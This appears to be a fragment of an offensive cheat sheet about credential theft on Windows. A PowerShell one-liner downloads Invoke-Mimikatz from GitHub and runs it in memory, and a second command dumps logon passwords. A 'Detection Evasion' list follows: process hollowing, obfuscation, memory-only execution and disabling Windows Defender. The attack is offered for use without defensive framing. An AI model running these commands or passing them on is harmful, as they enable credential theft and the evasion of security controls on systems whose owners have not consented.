
powershellIEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -Command '"privilege::debug" "sekurlsa::logonpasswords"'
Detection Evasion

Use process hollowing
Encrypt/obfuscate binary
Use memory-only execution
Disable Windows Defender